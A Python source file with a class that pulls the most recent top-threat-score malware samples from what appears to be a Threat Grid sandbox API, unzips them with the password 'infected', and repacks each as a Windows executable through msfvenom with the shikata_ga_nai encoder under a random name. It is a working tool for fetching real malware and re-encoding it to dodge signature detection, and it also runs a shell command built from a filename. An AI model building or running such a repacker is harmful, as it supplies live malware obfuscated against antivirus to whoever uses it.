from zipfile import ZipFile
import os
import pipes
import random
import requests
import subprocess
import string

class TGHandler(object):
    def __init__(self, api_key, domain, malware_folder):
        self.api_key = api_key
        self.domain = domain
        self.malware_folder = malware_folder
        self.tg_url = 'https://' + domain + '/api/v2/search/submissions'
        self.tg_artifact_url = 'https://' + domain + '/api/v2/samples/{}/sample.zip'
    
    def get_random_string(self, stringLength=8):
        letters = string.ascii_lowercase
        
        return ''.join(random.choice(letters) for i in range(stringLength))
    
    def list_to_string(self, s):
        str1 = ""
        for ele in s:
            str1 += ele

        return str1
    
    def refreshMalware(self, malware_count):
        tg_parameters = {'api_key': self.api_key,
                    'advanced':'true',
                    'state':'succ',
                    'q':'analysis.threat_score:100',
                    'sort_by':'submitted_at',
                    'sort_order':'desc'}

        resp = requests.get(self.tg_url, params=tg_parameters)
        json_resp = resp.json()

        for i in range(0,malware_count):
            sampleid = json_resp['data']['items'][i]['item']['sample']
            print('Using Sample ID: ' + sampleid)
            tg_download_parameters = {'api_key': self.api_key}
            resp = requests.get(self.tg_artifact_url.format(sampleid), params = tg_download_parameters)
            sampleid_value_zip = sampleid + '.zip'
            with open(sampleid_value_zip, 'wb') as f:
                f.write(resp.content)
            
            with ZipFile(sampleid_value_zip, 'r') as zipObj:
                filenames = zipObj.namelist()
                zipObj.extractall(pwd=b'infected')
            
            filename = self.list_to_string(filenames)
            os.rename(filename, filename + ".exe")
            print('Repacking File: ' + filename)
            filename = pipes.quote(filename)
            payloadname = self.get_random_string()
            try:
                subprocess.call(['msfvenom p generic/custom PAYLOADFILE-' + filename + '.exe -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o ./' + self.malware_folder + '/' + payloadname +'.exe'], shell=True)
            except Exception as e:
                print('Something went wrong when we asked MSFVenom to repack our malware. Is your install complete?\n' + str(e))
            
            os.remove('./' + filename + '.exe')
